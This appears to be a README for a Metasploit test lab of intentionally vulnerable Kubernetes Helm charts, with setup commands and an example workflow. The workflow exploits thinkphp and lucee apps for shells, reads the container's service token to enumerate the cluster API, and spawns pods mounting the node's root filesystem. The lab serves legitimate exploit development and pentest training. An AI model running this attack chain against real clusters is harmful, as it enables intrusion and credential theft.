### Kubernetes

A collection of Helm charts have been created to aid both Metasploit developers and pentesters explore Metasploit's
Kubernetes support and exploitation capabilities.

## Usage

Kubernetes is installed on your host machine with either [kind](https://kind.sigs.k8s.io/docs/user/quick-start/#installation),
[Minikube](https://minikube.sigs.k8s.io/docs/start/), [Docker Desktop](https://docs.docker.com/desktop/kubernetes/), or alternatives.

Next install the vulnerable charts and configuration:

```
docker-compose run setup
```

You can now use Metasploit from your host machine to target the intentionally vulnerable cluster.

To enter into an interactive environment with all of the required Helm/Kubectl tools available:

```
$ docker-compose run --service-ports setup /bin/sh
kubectl get all --all-namespaces
helm list
make install
```

## Available Charts

### secrets

Create multiple Kubernetes Secrets to test Metasploit's enumeration capabilities:
```
docker-compose run setup make secrets
```

### thinkphp

Run an intentionally vulnerable `thinkphp` application with full cluster access:

```
docker-compose run setup make thinkphp
```

Forwarding to host on port 9001:
```
docker-compose run --service-ports setup make forward-thinkphp
```

Exploitation will result in a Meterpreter session with full cluster access:
```
use unix/webapp/thinkphp_rce
run http://target_ip:9001
```

### lucee

Run an intentionally vulnerable `lucee` application with a default service account with minimal access:
```
docker-compose run setup lucee
```

Forwarding to host on port 9002:
```
docker-compose run --service-ports setup make forward-lucee
```

Exploitation will result in a cmd shell session with a default service account with minimal access:
```
use linux/http/lucee_admin_imgprocess_file_write
run http://target_ip:9002 lhost=...
```

### Workflow Example

First configure the Kubernetes environment:
```
docker-compose run setup
```

Now expose the exploitable thinkphp application to your host machine. In the real world this step would not be required
as the application would be most likely already be publicly accessible:

```
docker-compose run forward-thinkphp
```

Open Metasploit and exploit the thinkphp container to open a Metarpreter session:

```
use unix/webapp/thinkphp_rce
run http://target_ip:9001
```

The `auxiliary/cloud/kubernetes/enum_kubernetes` module can now be used to pivot through the compromised container to reach
the previously inaccessible Kubernetes API. In this scenario the container's Kubernetes service token will be read from the
file system, and used to authenticate with the Kubernetes API:

```
use auxiliary/cloud/kubernetes/enum_kubernetes
run session=-1
```

If the compromised service token has the required permissions to create new pods, it is possible to open additional Metasploit sessions and
run one-of tasks with the `exploit/multi/kubernetes/exec` module. This newly created pod will also attempt to mount the Kubernetes Node's
root filesystem to `/host_mnt`, which may lead to additional attack vectors:

```
use exploit/multi/kubernetes/exec
run session=-1
```

See the corresponding documentation for each module for more detail.

## Kubernetes Dashboard

To access the Kubernetes dashboard:

```
$ docker-compose run --service-ports setup /bin/sh
make dashboard
make admin-token
make forward-dashboard
```

Now visit https://localhost:9443 and use the generated token to authenticate
